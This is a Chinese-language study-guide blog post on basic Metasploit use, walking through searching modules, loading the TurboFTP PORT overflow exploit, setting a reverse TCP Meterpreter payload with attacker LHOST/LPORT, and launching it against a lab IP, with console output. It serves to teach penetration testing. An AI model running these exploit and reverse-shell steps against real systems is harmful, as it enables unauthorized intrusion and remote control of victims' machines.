---
layout: post
title: "Metasploit - Study Guide"
date: "2022-07-24"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Network Attacks
---

# Metasploit - Study Guide
这如何支持我的渗透测试生涯？
* 有各种各样的攻击可供您使用
* 自动化您自己的漏洞利用的能力

**Metasploit** 是一个用于渗透测试和漏洞利用开发的开源框架。 它适用于 MacOSX、Windows 和 Linux 操作系统。
Metasploit 为您提供了广泛的社区贡献的漏洞利用和攻击向量，可用于针对各种系统和技术。 此外，它是可扩展的，可用于自动化您自己的漏洞利用。

在本章中，您将学习 Metasploit 的基本用法和功能，例如：
* 界面
* 漏洞利用
* 有效载荷
* 漏洞利用处理

## MSFConsole（MSF控制台）
Metasploit 有一个 Web 界面、一个命令行界面和一个控制台界面 MSFConsole。

如图所示，它带有近 1400 个漏洞利用和 356 个有效载荷。
在下面的幻灯片中，您将看到如何使用所有这些功能！

使用 MSFConsole 攻击目标的基本工作流程是：
* 识别易受攻击的服务
* 为该服务寻找合适的漏洞利用
* 加载和配置漏洞利用
* 加载和配置您要使用的有效负载
* 运行漏洞利用代码并访问易受攻击的机器

您可以通过在命令行中键入以下内容来启动 MSFConsole：`msfconsole`
让我们看看如何使用它！

在开始之前，请注意每个 Metasploit 命令都提供了一些简短的帮助信息。 您可以使用 -h 开关显示帮助：

```
msf6 > show -h
[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions
```

在以下幻灯片中，您将看到在渗透测试期间学习使用 Metasploit 所需的命令。

## Identifying a Vulnerable Service（识别易受攻击的服务）
如您所知，信息收集阶段对于成功的渗透测试至关重要。 此外，在进入实际利用阶段之前，您需要执行漏洞评估步骤。
**在不了解目标的情况下，您无法使用 Metasploit 等工具获利！**

## Searching（搜索）
Metasploit 在其**模块**中包含漏洞利用代码和其他功能。 在撰写本文时，它包含近 3000 个模块。 您可以使用搜索命令搜索特定模块：

```
search <mysearchterm>
```

如果您提供了多个搜索词，Metasploit 将对您提交的每个字符串执行查询。

如果您搜索“skeleton”，您将得到一个结果：

```
msf6 > search skeleton

Matching Modules
================

   #  Name                                                Disclosure Date  Rank    Check  Description
   -  ----                                                ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/host_header_injection                         normal  No     HTTP Host Header Injection Detection
   1  exploit/multi/browser/java_jre17_provider_skeleton  2013-06-18       great   No     Java Applet ProviderSkeleton Insecure Invoke Method
   2  exploit/windows/fileformat/office_ms17_11882        2017-11-15       manual  No     Microsoft Office CVE-2017-11882


Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/fileformat/office_ms17_11882
```

同样搜索“turboftp”会返回一个结果：

```
msf6 > search turboftp

Matching Modules
================

   #  Name                               Disclosure Date  Rank   Check  Description
   -  ----                               ---------------  ----   -----  -----------
   0  exploit/windows/ftp/turboftp_port  2012-10-03       great  Yes    Turbo FTP Server 1.30.823 PORT Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/ftp/turboftp_port
```

搜索两者都会返回两个结果：

```
search skeleton turboftp
```

注意：在metasploit v6.2.4-dev中显示`[-] No results from search`。

显示漏洞的另一种方法是使用 show 命令：

```
msf6 > show exploits
```

不幸的是，有成千上万的漏洞可用，使用它是非常不切实际的。

## Configuring an Exploit（配置漏洞利用）
选择要使用的漏洞利用后，您可以使用 `use` 命令启用它，然后是漏洞利用路径。
如果你想使用 turboftp 的漏洞利用，你必须输入：

```
msf6 > use exploit/windows/ftp/turboftp_port
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/ftp/turboftp_port) > 
```

请注意选择漏洞利用时 MSFConsole 如何迅速更改； 这是因为 Metasploit 使用**类似文件系统的层次结构**来存储编码器、nops、漏洞利用、有效负载和辅助模块。
例如，所有与 Windows 相关的漏洞利用都以 `exploit/windows` 开头。

如果要返回到主 msf 提示符，可以使用 back 命令。

```
msf6 > use exploit/windows/ftp/turboftp_port
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/ftp/turboftp_port) > back
msf6 > 

```

加载漏洞利用后，您可以使用 info 命令查看相关信息。

```
msf6 > use exploit/windows/ftp/turboftp_port
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/ftp/turboftp_port) > info

       Name: Turbo FTP Server 1.30.823 PORT Overflow
     Module: exploit/windows/ftp/turboftp_port
   Platform: Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Great
  Disclosed: 2012-10-03

Provided by:
  Zhao Liang
  Lincoln
  corelanc0d3r
  thelightcosine

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   Windows Universal TurboFtp 1.30.823
  2   Windows Universal TurboFtp 1.30.826

Check supported:
  Yes

Basic options:
  Name     Current Setting      Required  Description
  ----     ---------------      --------  -----------
  FTPPASS  mozilla@example.com  no        The password for the specified username
  FTPUSER  anonymous            no        The username to authenticate as
  RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  RPORT    21                   yes       The target port (TCP)

Payload information:
  Avoid: 4 characters

Description:
  This module exploits a buffer overflow vulnerability found in the 
  PORT command in Turbo FTP Server 1.30.823 & 1.30.826, which results 
  in remote code execution under the context of SYSTEM.

References:
  https://www.exploit-db.com/exploits/22161
  OSVDB (85887)
```

您还可以使用 show options 命令检查其选项。

```
msf6 exploit(windows/ftp/turboftp_port) > show options

Module options (exploit/windows/ftp/turboftp_port):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    21                   yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.248.148  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

要配置选项，您必须使用 `set` 命令：

```
msf6 exploit(windows/ftp/turboftp_port) > set -h
[-] Unknown variable
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

msf6 exploit(windows/ftp/turboftp_port) > set RHOST 10.99.45.8
RHOST => 10.99.45.8
msf6 exploit(windows/ftp/turboftp_port) > set FTPUSER example
FTPUSER => example
msf6 exploit(windows/ftp/turboftp_port) > set FTPPASS examplepass
FTPPASS => examplepass
```

```
[-] 未知变量
用法：设置[选项] [值]

将给定选项设置为 value。 如果省略 value，则打印当前值。 如果两者都省略，则打印当前设置的选项。

如果从模块上下文运行，这将在模块的数据存储中设置值。 使用 -g 对全局数据存储进行操作。

如果设置 PAYLOAD，此命令可以从“show payloads”中获取索引。
```

## Configuring a Payload（配置有效负载）
要运行漏洞利用，需要**有效载荷**。 有效载荷是漏洞利用模块注入受害者机器或服务的代码片段。
攻击者使用有效载荷来获取：
* 操作系统Shell
* VNC 或 RDP 连接
* **Meterpreter shell**
* 执行攻击者提供的应用程序

Metasploit 为不同的操作系统、不同的架构和不同的功能提供不同的有效负载。 您可以通过在 MSFConsole 提示符下键入`show payloads`来列出它们。
如果您在使用漏洞利用程序时启动 `show payloads` 命令，您将只看到与该特定漏洞利用程序一起工作的有效负载。

您可以通过发出 `set payload` 命令选择要使用的有效负载，后跟有效负载名称。 然后您可以使用 `show options` 命令检查其选项。

```
msf6 exploit(windows/ftp/turboftp_port) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/ftp/turboftp_port) > show options

Module options (exploit/windows/ftp/turboftp_port):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   FTPPASS  examplepass      no        The password for the specified username
   FTPUSER  example          no        The username to authenticate as
   RHOSTS   10.99.45.8       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    21               yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.248.148  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

要配置有效负载，请使用 `set` 命令。

```
msf6 exploit(windows/ftp/turboftp_port) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/ftp/turboftp_port) > set LHOST 192.168.11.4
LHOST => 192.168.11.4
msf6 exploit(windows/ftp/turboftp_port) > set LPORT 1234
LPORT => 1234
```

配置好漏洞利用和有效载荷后，您就可以发起攻击了！

## Running an Exploit（运行漏洞利用）
启动exploit 只需在命令行上发出`exploit` 命令即可。

```
msf6 exploit(windows/ftp/turboftp_port) > exploit -h
Usage: run [options] [RHOSTS]

Run the current exploit module

OPTIONS:

    -e, --encoder <encoder>          The payload encoder to use.  If none is specified, ENCODER is used.
    -f, --force-run                  Force the exploit to run regardless of the value of MinimumRank.
    -h, --help                       Help banner.
    -J, --foreground                 Force running in the foreground, even if passive.
    -j, --job                        Run in the context of a job.
    -n, --nop-generator <generator>  The NOP generator to use.  If none is specified, NOP is used.
    -o, --options <options>          A comma separated list of options in VAR=VAL format.
    -p, --payload <payload>          The payload to use.  If none is specified, PAYLOAD is used.
    -q, --quiet                      Run the module in quiet mode with no output
    -t, --target <target>            The target index to use.  If none is specified, TARGET is used.
    -z, --no-interact                Do not interact with the session after successful exploitation.

Examples:

    run 192.168.1.123
    run 192.168.1.1-192.168.1.254
    run file:///tmp/rhost_list.txt

Learn more at https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit

msf6 exploit(windows/ftp/turboftp_port) > exploit

[*] Started reverse TCP handler on 0.0.0.0:1234 
[*] 10.99.45.8:21 - Automatically detecting the target
```

```
用法：运行 [选项] [RHOSTS]

运行当前的漏洞利用模块

选项：

    -e, --encoder <encoder> 要使用的有效负载编码器。如果未指定，则使用 E​​NCODER。
    -f, --force-run 强制漏洞利用运行，而不管 MinimumRank 的值。
    -h, --help 帮助横幅。
    -J, --foreground 强制在前台运行，即使是被动的。
    -j, --job 在作业的上下文中运行。
    -n, --nop-generator <generator> 要使用的 NOP 生成器。如果没有指定，则使用 NOP。
    -o, --options <options> VAR=VAL 格式的选项的逗号分隔列表。
    -p, --payload <payload> 要使用的有效负载。如果未指定，则使用 PAYLOAD。
    -q, --quiet 以安静模式运行模块，无输出
    -t, --target <target> 要使用的目标索引。如果未指定，则使用 TARGET。
    -z, --no-interact 成功利用后不与会话交互。
```

敲击回车后，对目标机器执行漏洞利用。 此时，它将执行有效负载。
大多数时候，渗透测试人员的目标是在目标机器上获得一个shell。 他们可以通过选择正确的 Metasploit 有效负载来实现这一目标。 **Meterpreter** 是一个特殊的有效负载，在渗透测试的角度下具有许多有用的功能。

## References
[Metasploit](https://www.metasploit.com/)
